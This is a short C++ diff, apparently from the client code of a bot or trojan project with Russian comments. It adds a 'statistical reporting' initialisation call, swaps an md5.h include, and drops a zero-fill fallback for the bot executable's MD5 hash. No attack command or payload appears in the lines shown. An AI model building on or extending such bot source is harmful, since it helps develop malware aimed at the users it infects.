@@ -5,7 +5,7 @@
 #include "BotUtils.h"
 #include "HTTPConsts.h"
 #include "BotDef.h"
-#include "md5.h"
+#include "DbgRpt.h"
 
 //---------------------------------------------------------------------------
 
@@ -168,10 +168,14 @@ void BOT::Initialize()
 	GetWorkFolderHash();
 
 	GenerateUid(BOT_UID);
+
 	// Включаем создание дампа при исключении
 	// Пытаемся встать в начало списка, что дает нам возможность перехватить
 	// ошибку до возможно установленных системных VEH.
 	//InitialializeGlogalExceptionLogger(TRUE);
+
+	// Инициализируем подсистему статистической отчетности.
+	DebugReportInit();
 }
 
 //----------------------------------------------------------------------------
@@ -334,17 +338,9 @@ string BOT::BotExeMD5()
 
 	string Result = CalcFileMD5Hash2(FileName);
 
-	if (Result.IsEmpty())
-	{
-		// Не удалось получить хэш
-		Result.SetLength(32);
-		m_memset(Result.t_str(), '0', 32);
-    }
-
 	STR::Free(FileName);
 
 	return Result;
 }
-
 
 
